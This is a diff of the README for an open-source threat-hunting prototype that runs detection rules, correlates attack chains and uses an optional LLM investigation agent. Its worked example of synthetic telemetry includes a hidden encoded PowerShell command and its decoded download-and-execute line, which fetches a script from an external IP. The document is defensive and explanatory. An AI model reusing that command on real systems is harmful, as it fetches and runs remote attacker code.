@@ -9,8 +9,9 @@ that distinguish observed facts from inferences and unverified hypotheses.
 
 **Core approach: deterministic detection first; AI reasoning second.** The complete
 deterministic workflow runs offline without an API key. An LLM can assist with
-investigation planning and synthesis, but it cannot create telemetry facts, invent
-tools, or bypass evidence verification.
+investigation planning and synthesis through a fixed tool interface. Models cannot
+author `FACT` claims. Verification rejects invalid references and, in operational-v2,
+unsupported typed predicates; it does not prove arbitrary model prose is correct.
 
 > **Status — research prototype, actively developed.** The core investigation
 > workflow is implemented. Milestones 1–19 are complete or measured; M19b's
@@ -26,11 +27,12 @@ tools, or bypass evidence verification.
 | **Detection & correlation** | **20 deterministic rules** with KQL counterparts, evidence-gated MITRE ATT&CK mappings, and structural attack-chain correlation |
 | **Agentic investigation** | Read-only evidence tools; capability-gated endpoint, identity, network, ATT&CK, and control-plane specialists; optional LLM planning and synthesis |
 | **Trust & observability** | Verified event references, `FACT` / `INFERENCE` / `HYPOTHESIS` claim types, bounded investigation profiles, telemetry-visibility and coverage reporting |
+| **Persistence** | Optional PostgreSQL jobs, leases, retries, attempt history and report revisions; new jobs use operational-v2 |
 | **Outputs & evaluation** | Evidence-cited Markdown/JSON reports, per-rule and incident-level metrics, analyst-feedback tracking, held-out external-data experiments, and agent ablations |
 
 **Technologies:** Python · pandas · pytest · KQL · MITRE ATT&CK ·
 Microsoft Defender telemetry · AWS CloudTrail · Kubernetes audit logs ·
-LangGraph (optional runtime) · LLM integration (optional)
+PostgreSQL (optional durable jobs) · LangGraph (optional runtime) · LLM integration (optional)
 
 ### Measured results — with their scope
 
@@ -48,6 +50,12 @@ See the [detector evaluation](#detector-evaluation),
 [roadmap](#roadmap) for the underlying methodology and reports.
 
 ### Explore the project
+
+This README describes the current application. The [query guide](queries/README.md)
+covers KQL examples. The [M17](reports/m17/canonical/README.md) and
+[M18b](reports/m18b/canonical/README.md) READMEs describe historical, omitted data
+freezes. The [review guide](reports/m19b/review/README.md) is for human assessment of
+M19 outputs, not an application runbook. Historical results keep their original scope.
 
 [Run ATH](#quick-start) · [Understand the architecture](#core-design-principle) ·
 [Review the detectors](#detections) · [See an investigation](#the-investigation-agent) ·
@@ -114,11 +122,11 @@ Existing research configurations and frozen experiments retain their defaults.
 
 ## Quick start
 
-Requires Python and the dependencies in `requirements.txt`. The core path below
+Requires Python **3.10 or newer** and the dependencies in `requirements.txt`. The core path below
 runs **without an API key or network access after installation**.
 
 ```bash
-git clone <repo>
+git clone https://github.com/shayb1187-a11y/agentic-threat-hunter.git
 cd agentic-threat-hunter
 python -m venv .venv
 source .venv/bin/activate   # Windows: .venv\Scripts\activate
@@ -128,14 +136,22 @@ python main.py generate
 python main.py hunt --summary
 python main.py chains
 python main.py investigate --no-llm --case CASE-001
-python main.py report --case CASE-001 --stdout
+python main.py report --no-llm --case CASE-001 --stdout
 pytest -q
 ```
 
 The commands above use the shipped synthetic demo. To analyze an imported
 Defender-style export, use `import-defender` and then the same
 `hunt → chains → investigate → report` workflow.
-External corpora are fetched separately and are not included in the repository.
+Full external corpora are fetched separately. Small cited test fixtures and selected
+experiment cuts are included; see [External datasets](#external-datasets).
+
+These quick-start commands use the legacy investigation/report path. For new bounded
+investigations, use `python main.py investigate --profile operational-v2 --no-llm`.
+For v2 reports and attempt history, use
+`python main.py jobs run --no-llm --json reports/local/jobs.json` or the
+[PostgreSQL job commands](docs/persistence-and-background-execution.md#usage).
+`report` runs a fresh legacy investigation; it does not render a previous v2 run.
 
 <details>
 <summary><strong>Full CLI command reference (detection, imports, evaluation, visibility, reporting)</strong></summary>
@@ -158,6 +174,9 @@ python main.py chains --explain    # ...and why each link was made
 python main.py investigate                    # autonomous investigation (uses LLM if configured)
 python main.py investigate --no-llm           # force fully deterministic mode
 python main.py investigate --case CASE-001 -v # verbose: show tool calls + rejections
+python main.py investigate --profile operational-v2 --no-llm # bounded typed evidence checks
+python main.py jobs run --no-llm              # v2 jobs; in memory unless ATH_DATABASE_URL is set
+python main.py jobs --help                    # durable queue, worker, status and report commands
 
 python main.py report                         # calibrated Markdown report per case -> reports/
 python main.py report --case CASE-001 --stdout # print instead of writing a file
@@ -228,17 +247,21 @@ agentic-threat-hunter/
 │   ├── mitre/           # ✅ verified ATT&CK catalogue + evidence-gated mapper
 │   │   ├── attack.py    #    Technique catalogue, Tactic, AttackMapping
 │   │   └── mapper.py    #    gated rule -> technique interpretations
-│   ├── evaluation/      # ✅ precision/recall vs ground truth (only reader of labels)
 │   ├── correlation/     # ✅ multi-signal chain reconstruction
 │   │   ├── chain.py     #    InvestigationCase, FindingLink, TimelineEntry
 │   │   └── correlator.py#    scoring + structural-evidence requirement
 │   ├── agent/           # ✅ autonomous investigation layer (works with NO API key)
 │   │   ├── claims.py    #    Claim (FACT/INFERENCE/HYPOTHESIS) + ClaimVerifier
+│   │   ├── operational.py #  versioned budgets and incomplete outcomes
+│   │   ├── evidence.py  #    typed telemetry predicates
+│   │   ├── structured.py#    v2 model contract and checked observations
 │   │   ├── tools.py     #    read-only ToolBox -- the agent's ONLY route to data
 │   │   ├── specialists.py#   Endpoint/Identity/Network/ControlPlane/ATT&CK agents, gated
 │   │   ├── orchestrator.py#  plan -> act -> verify loop; roster from ath.capabilities
 │   │   ├── llm.py       #    NullLLM / ScriptedLLM / AnthropicLLM behind one interface
 │   │   └── graph.py     #    optional LangGraph adapter (same logic, different runtime)
+│   ├── persistence/     # optional PostgreSQL/in-memory jobs, attempts, leases and reports
+│   ├── behavior/        # shared timing features used by triage and investigation
 │   ├── capabilities/    # ✅ environment-driven crew assembly (Milestone 13)
 │   │   ├── registry.py  #    CapabilitySpec: what each capability needs, requires_all/any
 │   │   └── crew.py      #    assemble_crew(): observable_channels -> the crew that fits
@@ -252,6 +275,7 @@ agentic-threat-hunter/
 │   │   └── harness.py   #    scoring, reusing ath.evaluation.score_rule directly
 │   ├── evaluation/      # ✅ per-rule scoring + end-to-end incident benchmark
 │   │   ├── evaluator.py #    precision/recall per rule (only reader of labels)
+│   │   ├── auth_execution.py # separately frozen synthetic operational-v2 comparison
 │   │   ├── incidents.py #    whole-pipeline metrics: load, noise, chain quality, cost
 │   │   └── suite.py     #    the incidents this project reports itself against
 │   ├── triage/          # ✅ arguing the innocent explanation, with cited evidence
@@ -266,7 +290,7 @@ agentic-threat-hunter/
 │                        #   milestone reports M14-M20 (see the roadmap for links)
 ├── data/external/       # MANIFEST.json + fetch index only; corpora are fetched, never committed
 ├── scripts/             # milestone measurement scripts + fetch_external.py
-├── tests/               # pytest suite; the count is asserted by tests/test_docs_claims.py, not typed here
+├── tests/               # pytest; test_docs_claims.py checks demo metrics and rule counts
 └── main.py
 ```
 
@@ -291,7 +315,7 @@ Finding objects  (evidence-backed, cannot exist without event ids)
       Investigation Orchestrator  (plan -> act -> verify, optional LLM)
             |
             +--> Specialist agents  -> Claims (FACT / INFERENCE / HYPOTHESIS)
-            +--> ClaimVerifier      -> rejects anything not traceable to real telemetry
+            +--> ClaimVerifier      -> checks references and optional typed predicates
                      |
                      v
                Report builder  ->  calibrated Markdown / JSON, evidence-cited throughout
@@ -300,7 +324,7 @@ Finding objects  (evidence-backed, cannot exist without event ids)
 Each arrow is one-way. Nothing downstream can influence whether a finding is raised,
 and nothing except `evaluation/` may read ground-truth labels -- enforced by an
 AST-parsing test, not by discipline. The agent layer adds one more constraint of its
-own: the model never sees raw telemetry, only tool results, and it can never author a
+own: the model receives selected tool results rather than the full corpus, and it can never author a
 `FACT` -- enforced at claim construction, not by prompting.
 
 ---
@@ -510,8 +534,10 @@ control-plane behaviour rules that never enumerate an API name
 Windows dataset the eight cloud rules are `not_eligible` -- their tables are empty, and
 `python main.py visibility` says so rather than counting their silence as coverage.
 
-Every rule has a matching `.kql` file in [`queries/`](queries/) written against the real
-Microsoft Defender advanced-hunting schema, plus a
+Every rule has a matching `.kql` file in [`queries/`](queries/). Endpoint examples use
+Defender tables, AWS examples use `AWSCloudTrail`, and Kubernetes examples assume a
+custom `KubeAuditLogs` table. These are documented counterparts, not tested guarantees
+of identical results; some use fixed buckets where pandas uses sliding windows. See the
 [KQL primer](queries/README.md) covering `where`, `project`, `extend`, `summarize`,
 `join`, `ago()` and the `contains` vs `has` distinction. Unit tests assert the two
 layers cannot drift apart in either direction: every registered rule has a `.kql`
@@ -808,7 +834,8 @@ itself.
 
 ### What this closed, concretely
 
-The correlated attack chain now spans all 10 labelled stages end to end:
+The original PC01 intrusion has 10 labelled stages; the current demo has 12 across
+both attack scenarios. Its correlated PC01 chain spans the following mapped tactics:
 
 ```
 Execution -> Persistence -> Stealth -> Credential Access -> Discovery
@@ -845,7 +872,7 @@ Two findings link only when they clear **both** bars: score >= 5 **and** at leas
 | Signal | Weight | Structural? |
 | ------ | ------ | ----------- |
 | `shared_evidence` -- the same event supports both | +3 | yes |
-| `same_process` -- same (host, PID) | +3 | yes |
+| `same_process` -- matching process instance; labelled PID fallback when identity is absent | +3 | yes |
 | `process_lineage` -- one process is the other's parent | +3 | yes |
 | `host_movement` -- one finding's host is the other's auth source/target | +3 | yes |
 | `auth_then_exec` -- successful logon, then service execution on that host | +3 | yes |
@@ -862,14 +889,15 @@ the naive behaviour it prevents.
 ### What could still correlate wrongly
 
 Stated plainly rather than buried: jump boxes and terminal servers legitimately generate
-`host_movement` and `auth_then_exec` between unrelated sessions; Windows recycles PIDs,
-so `same_process` can eventually join different processes (real EDR uses a process GUID,
-which our telemetry lacks); cases are connected components, so one bad link merges two
-cases; and busy service accounts over-group via `same_user`.
+`host_movement` and `auth_then_exec` between unrelated sessions. Source-qualified process
+identities reduce PID-reuse errors when present; missing identities still permit an
+explicitly labelled PID fallback in correlation. Operational-v2 does not promote that
+fallback to a verified process relationship. Cases are connected components, so one
+incorrect structural link can merge cases; `same_user` alone cannot create a link.
 
 ### Example: telemetry -> finding -> ATT&CK -> chain
 
-**1. Raw telemetry** (`data/raw/process_events.csv`, event `evt-000322`):
+**1. Raw telemetry** (`data/raw/process_events.csv`, event `evt-000357`):
 
 ```
 timestamp=2026-08-17T09:12:41Z  device=PC01  user=jdoe
@@ -880,8 +908,8 @@ command_line=powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA
 **2. Findings** -- two rules fire on this one event:
 
 ```
-[HIGH] ATH-001 Office application spawned a script interpreter   evidence: evt-000322
-[HIGH] ATH-002 Encoded PowerShell command execution              evidence: evt-000322
+[HIGH] ATH-001 Office application spawned a script interpreter   evidence: evt-000357
+[HIGH] ATH-002 Encoded PowerShell command execution              evidence: evt-000357
        decoded: IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.47/a.ps1')
 ```
 
@@ -904,28 +932,34 @@ CASE-001  [CRITICAL]  confidence=high
              -> Lateral Movement -> Collection -> Command and Control
 
   time     rule     severity  user        host / movement  technique                  events
-  09:12:04 ATH-009  MEDIUM    jdoe        PC01             T1204.002                  evt-000320
-  09:12:41 ATH-001  HIGH      jdoe        PC01             T1059.001,T1204.002        evt-000322
-  09:12:41 ATH-002  HIGH      jdoe        PC01             T1027.010,T1059.001,T1105  evt-000322
-  09:12:43 ATH-003  HIGH      jdoe        PC01             T1071.001,T1105            evt-000323 (+6)
-  09:15:03 ATH-010  MEDIUM    jdoe        PC01             T1033,T1069.002,T1482      evt-000332 (+2)
-  09:18:22 ATH-004  CRITICAL  jdoe        PC01             T1003.001,T1218.011        evt-000344
-  09:28:00 ATH-005  CRITICAL  svc_backup  FS02             T1078,T1110.001            evt-000394 (+14)
-  09:33:47 ATH-006  HIGH      svc_backup  PC01 -> FS02     T1021.002,T1078            evt-000431
-  09:34:12 ATH-007  HIGH      svc_backup  FS02             T1021.002,T1569.002        evt-000435
-  09:35:40 ATH-008  HIGH      svc_backup  FS02             T1074.001,T1560.001        evt-000445
-  09:37:05 ATH-003  MEDIUM    svc_backup  FS02             T1071.001                  evt-000454
+  09:12:04 ATH-009  MEDIUM    jdoe        PC01             T1204.002                  evt-000355
+  09:12:41 ATH-001  HIGH      jdoe        PC01             T1059.001,T1204.002        evt-000357
+  09:12:41 ATH-002  HIGH      jdoe        PC01             T1027.010,T1059.001,T1105  evt-000357
+  09:12:43 ATH-003  HIGH      jdoe        PC01             T1071.001,T1105            evt-000358 (+6)
+  09:15:03 ATH-010  MEDIUM    jdoe        PC01             T1033,T1069.002,T1482      evt-000367 (+2)
+  09:18:22 ATH-004  CRITICAL  jdoe        PC01             T1003.001,T1218.011        evt-000381
+  09:28:00 ATH-005  CRITICAL  svc_backup  FS02             T1078,T1110.001            evt-000419 (+14)
+  09:33:47 ATH-006  HIGH      svc_backup  PC01 -> FS02     T1021.002,T1078            evt-000457
+  09:34:12 ATH-007  HIGH      svc_backup  FS02             T1021.002,T1569.002        evt-000461
+  09:35:40 ATH-008  HIGH      svc_backup  FS02             T1074.001,T1560.001        evt-000469
+  09:37:05 ATH-003  MEDIUM    svc_backup  FS02             T1071.001                  evt-000481
 ```
 
-Eleven findings, 31 telemetry events, two hosts, 19 links -- all 19 structural. `ATH-009`
+Eleven findings, 31 telemetry events, two hosts, 24 links -- all 24 structural. `ATH-009`
 and `ATH-010` (added by the [detection-engineering loop](#detection-engineering-loop))
 correlate into this same case automatically, via shared process lineage, with no change
-to the correlator. The administrator's two findings form a separate `CASE-002` and
-never merge in.
+to the correlator. The administrator's two findings are set aside by benign triage. `CASE-002` is the separate PC03
+ransomware-preparation session, containing ATH-011 and ATH-012.
 
 ---
 
 ## The investigation agent
+
+This section describes the legacy specialist orchestrator used by the quick start.
+Operational-v1/v2 use deterministic specialists without a model, or the bounded D1
+probe loop with a model. Their budgets, stopping rules and claim handling are
+[documented separately](docs/operational-investigation.md). In D1, a model may choose
+`none` to stop probing; this differs from the legacy planner described below.
 
 Everything above this line is deterministic Python. This section is the one place an
 LLM can participate -- and it can be removed entirely (`--no-llm`, or simply no API key
@@ -966,11 +1000,15 @@ If the model "believes" something is a fact, the correct move is to call a tool 
 the *tool* author the FACT. A model's belief about the data is an inference until
 confirmed.
 
-### The verifier: the anti-hallucination control
+### The verifier: reference integrity and typed evidence
 
 `ClaimVerifier` checks every claim's `evidence_ids` against the real telemetry loaded for
 that run. A claim citing an event id that does not exist is rejected -- kept, not
-discarded, so a hallucination rate is a measurable property of a run rather than a vibe.
+discarded, so reference failures are auditable. This does not measure all hallucinations
+or establish that a sentence follows from its citations. Operational-v2 additionally
+checks typed premises and reserves FACT for template-rendered, supported observations;
+unstructured detector/tool summaries become INFERENCE. The table above describes
+legacy provenance rules. See [evidence verification](docs/evidence-verification.md).
 Demonstrated directly in `tests/test_orchestrator.py`: a scripted, deliberately
 adversarial model response containing one legitimate claim, one claim citing a
 fabricated event id, and one attempted FACT is fed to the orchestrator. The result:
@@ -1090,7 +1128,7 @@ Two constraints make "autonomous" mean something specific rather than "unsupervi
 
 With `NullLLM` (no API key, or `--no-llm`), the planner uses a fixed priority order and
 synthesis is skipped. The investigation still runs to completion and produces the full
-set of evidence-backed claims -- 49 of them for `CASE-001` in this dataset, 19 FACT, 28
+set of cited claims -- 50 of them for `CASE-001` in the current legacy demo, 20 FACT, 28
 INFERENCE, 2 HYPOTHESIS, 0 rejected. The model adds planning judgement and cross-claim
 synthesis on top; it does not gate whether the system works.
 
@@ -1106,43 +1144,22 @@ to raise `ImportError` and checking the orchestrator falls back transparently.
 
 ### Example: CASE-001 investigated
 
+Current legacy demo summary (the longer claim lists are omitted):
+
 ```
 $ python main.py investigate --no-llm --case CASE-001
 
 status     : complete
 steps      : 4  |  agents run: endpoint, identity, network, attack
-claims     : 19 facts, 28 inferences, 2 hypotheses
-
--- investigation path --
-  step 1: endpoint -- deterministic priority order; case contains process-based findings
-  step 2: identity -- deterministic priority order; case contains authentication findings
-  step 3: network  -- deterministic priority order; case contains external connection findings
-  step 4: attack    -- only eligible specialist; ATT&CK mappings + gathered evidence
-  step 5: stop      -- no specialist has further useful work on the available evidence
-
--- FACTS --
-  FACT: On PC01, WINWORD.EXE (PID 4820) was started by OUTLOOK.EXE under account jdoe.
-    evidence: [evt-000320]
-  FACT: Execution chain on PC01: OUTLOOK.EXE -> WINWORD.EXE -> powershell.exe -> rundll32.exe.
-    evidence: [evt-000344, evt-000322, evt-000320]
-  FACT: Connections from PC01 to 185.220.101.47 occurred at a median interval of 300s
-        with a robust coefficient of variation (MAD/median) of 0.000 across 7 connections.
-    evidence: [evt-000323, evt-000326, evt-000341, evt-000372, evt-000398, evt-000427, evt-000457]
-
--- INFERENCES --
-  INFERENCE: The 14 failed authentications for 'svc_backup' followed by success are
-             consistent with the account's password having been guessed rather than
-             with ordinary user error.  (confidence 0.85)
-
--- HYPOTHESES (unverified, flagged as such) --
-  HYPOTHESIS: The credentials for 'svc_backup' may have been obtained from memory on
-              PC01. This is unverified: no telemetry links the credential-access
-              activity to this specific account.  (confidence 0.40)
-  HYPOTHESIS: Data staged on disk may have been transferred to the external destination
-              observed in this case. This is unverified: the telemetry records archive
-              creation and outbound connections separately, and does not show the
-              archive's contents leaving.  (confidence 0.50)
+claims     : 20 facts, 28 inferences, 2 hypotheses
+tool calls : 43
 ```
+
+The legacy report includes the observed Office-to-PowerShell process chain, an
+inference about the failed-authentication burst followed by success, and two open
+hypotheses: whether credentials came from memory on PC01, and whether staged data
+was exfiltrated. Operational-v2 produces a different fact/inference split because
+only supported typed observations retain FACT status.
 
 Note what the credential-source and exfiltration claims are: HYPOTHESES, not facts --
 because the telemetry genuinely does not establish either one. That is the entire point
@@ -1152,10 +1169,10 @@ of the epistemic split.
 
 ## Investigation reports
 
-`python main.py report` turns a completed investigation into a self-contained,
-evidence-cited document. Nothing in this layer calls a language model -- assembly is
-reorganisation over data the deterministic pipeline and the agent layer already
-produced (`src/ath/reporting/builder.py`).
+`python main.py report` runs a fresh legacy investigation and builds a self-contained,
+evidence-cited document. Report assembly itself is deterministic
+(`src/ath/reporting/builder.py`). The preceding investigation can call a configured
+model; pass `--no-llm` for an offline run.
 
 ### Calibration is enforced on the rendered sentence, not just the data type
 
@@ -1206,7 +1223,7 @@ no destructive capability and the report is not authorisation for one.
 
 The **Evidence Appendix** renders every underlying telemetry event -- timestamp, host,
 user, a one-line summary -- so a reader never has to re-run a tool to see what
-`evt-000322` actually was. Long inline evidence lists (a claim like "43 authentication
+`evt-000357` actually was. Long inline evidence lists (a claim like "43 authentication
 events" genuinely cites all 43) are truncated to 6 ids with a pointer to the appendix --
 a rendering choice only; the full list stays on the `Claim` object for verification.
 
@@ -1257,12 +1274,13 @@ cited counter-case:
     no remote code: Get-WmiObject -Class Win32_QuickFixEngineering
 ```
 
-### It annotates, never suppresses
+### It annotates findings; correlation can set them aside
 
 This is the same shape as the ATT&CK mapper: gated interpretations over findings the
 deterministic layer already produced. **No finding is ever deleted or edited.** A
-pipeline that silently dropped alerts it believed benign would be unauditable, and the
-first time it was wrong nobody would ever find out.
+pipeline retains the complete finding list and triage assessments. Case construction
+sets likely-benign findings aside; `hunt --triage` still shows the complete finding
+list and assessments. This reduces investigation load without deleting detector output.
 
 ### Benign evidence can be out-voted, never out-weighed
 
@@ -1391,7 +1409,7 @@ Benchmark numbers measure the system against scenarios its authors invented.
   opinion rate      : 75% (3/4; 1 left as needs-review)
 
   1 finding(s) called BENIGN that an analyst confirmed as real threats:
-    - ATH-002:evt-000322
+    - ATH-002:evt-000357
 
   measured false-positive cost by rule:
     ATH-003  2 analyst-confirmed false positive(s)
@@ -1824,6 +1842,18 @@ sections of this README.
 
 ## Roadmap
 
+The numbered M1–M20 rows below are the historical research milestones. The recent
+**operational steps 1–4** are a separate delivery sequence:
+
+| Operational step | Current status and instructions |
+| --- | --- |
+| 1 — bounded execution | Implemented: [operational-v1](docs/operational-investigation.md) |
+| 2 — evidence verification | Implemented: [operational-v2](docs/evidence-verification.md) |
+| 3 — auth-to-execution comparison | Harness and baseline implemented; saved live model comparison remains pending: [runbook and results](docs/auth-execution-evaluation.md) |
+| 4 — durable jobs | Implemented, including PostgreSQL integration tests: [setup and execution](docs/persistence-and-background-execution.md) |
+
+These statuses do not imply that M19b or M20 research runs have completed.
+
 | # | Milestone | Status |
 | - | --------- | ------ |
 | 1 | Telemetry schema, generator, loader, CLI, tests | ✅ done |
@@ -1900,12 +1930,13 @@ Stated up front, because overclaiming is the fastest way to fail a technical int
   schema, not against an actual production Defender tenant's export, which will contain
   edge cases (locale differences, additional ActionType values, partial exports) this
   project has not seen.
-- **The Defender adapter maps a deliberately small field set.** It carries over the
-  columns this project's canonical schema uses and drops the rest (hashes, signer
-  info, session ids, version metadata). A real investigation would often want those
-  too; extending the schema to carry them is a straightforward but real next step.
-- **`LogonType` translation covers exactly the five values Microsoft documents today.**
-  A future product change adding a sixth value would be dropped as an unrecognised-value
+- **The Defender adapter retains a selected field set.** It imports SHA256 when
+  available, company-name metadata into `signer`, and creation-time-based process
+  identities. Company metadata is not verified certificate identity; signature status
+  stays `unknown` without certificate telemetry. Other fields, such as session IDs
+  and most version metadata, are not preserved.
+- **`LogonType` translation covers five named values in the current adapter.**
+  An additional named value would be dropped as an unrecognised-value
   issue, not silently miscoded -- but it would still need a code change to translate.
 - **These detections are not production-ready.** They are illustrative hunting logic
   with documented assumptions, not tuned rules validated against an organisation's
@@ -2012,11 +2043,11 @@ Stated up front, because overclaiming is the fastest way to fail a technical int
   Authenticode for testing the logic above it, and it is not certificate validation. A
   real deployment needs actual signature data; the Defender adapter correctly reports
   `unknown` rather than inventing it.
-- **Low-and-slow C2 through trusted infrastructure is still cleared.** Four connections
-  to a widely-used destination over TLS stays under the sustained-contact threshold.
-  Closing it needs inter-arrival regularity, which lives in the investigation layer's
-  `analyse_beacon` and is not available at triage time. Asserted explicitly in
-  `test_attack_low_and_slow_through_a_popular_destination`.
+- **Timing signals do not establish C2 by themselves.** The earlier low-and-slow
+  false clearance was fixed by sharing `ath.behavior` features with triage. Regular
+  low-volume contact now withdraws benign reassurance in the regression fixture;
+  it does not prove maliciousness. This remains a small synthetic test, not validation
+  against all forms of low-and-slow traffic.
 - **Multi-window prevalence still has only one short window to work with.** The recent
   slice is the final quarter of whatever observation exists — four hours here. It
   distinguishes *emerging* from *established* in principle, and every figure carries a
@@ -2050,5 +2081,7 @@ Stated up front, because overclaiming is the fastest way to fail a technical int
   CRLF digest that verified on the Windows machine that wrote it and on nothing else;
   the guard test `test_arm_a_on_the_m19_manifest_is_unchanged_by_the_defect_fixes` was
   red on any Linux or macOS checkout. The terminator is now pinned to `\r\n` explicitly,
-  which makes every recorded hash verify everywhere without re-pinning a single frozen
-  artifact. The choice of CRLF is historical, not principled, and the code says so.
+  which fixes the newline difference without re-pinning frozen artifacts. It does not
+  eliminate all pandas/platform serialization differences: frozen v1 digests remain
+  runtime-sensitive. New operational jobs and the auth-execution pilot use the explicit
+  v2 serializer. Neither change makes missing external corpora available from a clone.
